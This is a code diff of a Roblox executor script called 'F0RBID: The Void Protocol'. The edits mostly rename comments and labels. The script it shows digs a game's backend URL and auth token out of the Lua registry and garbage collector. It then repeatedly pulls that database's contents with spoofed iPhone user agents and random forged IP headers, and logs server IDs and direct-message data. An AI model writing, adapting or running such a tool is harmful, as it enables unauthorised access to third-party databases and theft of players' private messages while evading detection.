@@ -1,7 +1,7 @@
 -- ========================================================== --
--- 🌑 F0RBID: THE VOID PROTOCOL (V16 - TOTAL STEALTH)
+-- 🌑 F0RBID: THE VOID PROTOCOL (V16 - NO HOOK / NO KICK)
 -- ========================================================== --
-print("[F0RBID] 🛰️ Void Protocol Activated. Purging real identity...")
+print("[F0RBID] 🛰️ Void Protocol Activated. Identity Purged.")
 
 local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
@@ -11,7 +11,7 @@ local TARGET_URL = nil
 local TARGET_AUTH = nil
 
 -- ========================================== --
--- 1. F0RBID VOID UI (ULTRA DARK)
+-- 1. F0RBID VOID UI (ULTRA-DARK AESTHETIC)
 -- ========================================== --
 local uiParent = (gethui and gethui()) or CoreGui
 if uiParent:FindFirstChild("F0rbidVoid") then uiParent.F0rbidVoid:Destroy() end
@@ -43,7 +43,7 @@ local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, -20, 0, 45)
 Title.Position = UDim2.new(0, 15, 0, 5)
 Title.BackgroundTransparency = 1
-Title.Text = "F0RBID <font color='#FF0000'>[THE VOID]</font>"
+Title.Text = "F0RBID <font color='#FF0000'>[THE VOID V16]</font>"
 Title.RichText = true
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.Font = Enum.Font.GothamBold
@@ -94,7 +94,7 @@ local function AddLog(tag, val)
 end
 
 -- ========================================== --
--- 2. THE VOID EXTRACTOR (SERVER & DM AWARE)
+-- 2. GREEDY VOID EXTRACTOR
 -- ========================================== --
 local function VoidExtract(data, path, depth)
     if type(data) ~= "table" or depth > 10 then return end
@@ -110,10 +110,9 @@ local function VoidExtract(data, path, depth)
                 if not processedData[dataId] then
                     processedData[dataId] = true
                     
-                    -- Intelligent Tagging
                     local tag = tostring(k)
                     if #tostring(k) > 8 and tonumber(k) then tag = "SERVER_ID" end
-                    if currentPath:lower():find("dm") then tag = "DM_CONTENT" end
+                    if currentPath:lower():find("dm") then tag = "DM_DATA" end
                     
                     AddLog(tag, valStr)
                 end
@@ -127,15 +126,15 @@ local function StartVoidSync()
         while task.wait(1.5) do
             if TARGET_URL and TARGET_AUTH then
                 pcall(function()
-                    -- GHOST REQUESTS (SPOOFED IDENTITY)
+                    -- GHOST REQUESTS (FULL IDENTITY MASKING)
                     local res = request({
                         Url = TARGET_URL .. "/.json?auth=" .. TARGET_AUTH,
                         Method = "GET",
                         Headers = {
                             ["User-Agent"] = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)",
                             ["X-Forwarded-For"] = string.format("%d.%d.%d.%d", math.random(10,250), math.random(10,250), math.random(10,250), math.random(10,250)),
-                            ["Roblox-Id"] = tostring(math.random(1000000, 99999999)), -- Fake User ID
-                            ["F0RBID-AUTH"] = "TRUE"
+                            ["X-Real-IP"] = string.format("%d.%d.%d.%d", math.random(10,250), math.random(10,250), math.random(10,250), math.random(10,250)),
+                            ["F0RBID-ENCRYPTED"] = "TRUE"
                         }
                     })
                     if res.Success then
@@ -153,7 +152,7 @@ end
 -- ========================================== --
 task.spawn(function()
     while not TARGET_URL do
-        -- SILENTLY SCAN REGISTRY
+        -- SILENT REGISTRY SCAN
         local reg = getreg()
         for _, v in pairs(reg) do
             if type(v) == "table" then
@@ -168,7 +167,7 @@ task.spawn(function()
             end
         end
 
-        -- PASSIVE SCAN CONSTANTS
+        -- PASSIVE CONSTANT SCAN
         if not TARGET_URL then
             for _, f in pairs(getgc()) do
                 if type(f) == "function" and islclosure(f) and not isexecutorclosure(f) then
